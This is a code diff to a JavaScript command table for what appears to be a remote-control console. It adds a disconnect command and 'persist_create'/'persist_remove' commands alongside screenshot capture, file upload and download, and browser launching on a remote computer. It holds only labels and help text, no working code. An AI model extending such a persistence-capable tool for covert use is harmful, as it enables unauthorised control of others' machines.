@@ -12,8 +12,11 @@ var inputHistorySSH = [];
 var commands = { 
     "status": { "id": 1, "help": "Check the status of a file transfer", "usage": "status" },
     "reconnect": { "id": 2, "help": "Force the remote computer to reconnect", "usage": "reconnect" },
+    "disconnect": { "id": 7, "help": "Force the remote computer to disconnect", "usage": "disconnect" },
     "screenshot": { "id": 5, "help": "Capture a screenshot", "usage": "\t\tscreenshot" },
     "upload": { "id": 3, "help": "Upload a file to the remote computer", "usage": "upload <file>" },
+    "persist_create": { "id": 8, "help": "Create persistence", "usage": "\t\t\tpersist_create" },
+    "persist_remove": { "id": 9, "help": "Remove persistence", "usage": "\t\t\tpersist_remove" },
     "download": { "id": 4, "help": "Downaload a file from the remote computer", "usage": "download <file>" },
     "chrome": { "id": 6, "help": "Launch Chrome browser", "usage": "\t\t\tchrome <tab1> <tab2> <tabn>" },
 }
